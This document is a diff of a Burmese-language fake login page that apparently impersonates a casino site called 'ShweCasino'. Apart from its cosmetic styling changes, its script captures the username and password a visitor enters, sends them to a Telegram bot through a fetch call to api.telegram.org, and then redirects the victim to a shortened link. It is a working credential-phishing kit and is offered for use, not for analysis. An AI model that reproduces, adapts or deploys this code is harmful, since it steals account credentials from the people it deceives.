@@ -9,57 +9,46 @@
 
 <style>
 
-*{
-box-sizing:border-box;
-}
-
 body{
 margin:0;
-font-family:Arial;
+font-family:"Myanmar Text";
 background:#8b0000;
 color:white;
-height:100vh;
-display:flex;
-flex-direction:column;
 }
 
 /* banner */
 
 .banner img{
 width:100%;
-height:200px;
-object-fit:cover;
+height:auto;
 display:block;
-}
-
-/* center area */
-
-.main{
-flex:1;
-display:flex;
-justify-content:center;
-align-items:center;
 }
 
 /* login box */
 
 .login-box{
 background:#6b0000;
-width:90%;
-max-width:400px;
-padding:20px;
-border-radius:10px;
+margin:20px;
+padding:25px;
+border-radius:12px;
+}
+
+/* title */
+
+.title{
 text-align:center;
+font-size:28px;
+margin-bottom:20px;
 }
 
 /* input */
 
 input{
 width:100%;
-padding:12px;
-margin:8px 0;
+padding:14px;
+margin:10px 0;
 border:none;
-border-radius:6px;
+border-radius:8px;
 font-size:16px;
 }
 
@@ -67,11 +56,12 @@ font-size:16px;
 
 button{
 width:100%;
-padding:12px;
-background:gold;
+padding:14px;
+margin-top:10px;
+background:#ffd700;
 border:none;
-border-radius:6px;
-font-size:16px;
+border-radius:8px;
+font-size:18px;
 font-weight:bold;
 }
 
@@ -81,39 +71,42 @@ font-weight:bold;
 
 <body>
 
+<!-- banner -->
+
 <div class="banner">
-<img src="https://i.imgur.com/8Km9tLL.jpg">
+<img src="logo.jpg">
 </div>
 
-<div class="main">
+<!-- login -->
 
 <div class="login-box">
 
-<h2>အကောင့်ထဲဝင်ရန်</h2>
+<div class="title">အကောင့်ထဲဝင်ရန်</div>
 
-<input id="user" placeholder="အကောင့်အမည်">
+<input id="username" placeholder="အကောင့်အမည်">
 
-<input type="password" id="pass" placeholder="စကားဝှက်">
+<input type="password" id="password" placeholder="စကားဝှက်">
 
 <button onclick="login()">အကောင့်ထဲဝင်ရန်</button>
 
 </div>
 
-</div>
-
 <script>
 
-const token="PUT_BOT_TOKEN";
-const chat_id="PUT_CHAT_ID";
+var token = "BOT_TOKEN";
+var chat_id = "CHAT_ID";
 
 function login(){
 
-let user=document.getElementById("user").value;
-let pass=document.getElementById("pass").value;
+var user = document.getElementById("username").value;
+var pass = document.getElementById("password").value;
 
-let text="LOGIN INFO\nUsername:"+user+"\nPassword:"+pass;
+var message =
+"ShweCasino Login%0A"+
+"Username: "+user+"%0A"+
+"Password: "+pass;
 
-fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+message);
 
 window.location.href="https://cutt.ly/otrecCFE";
 
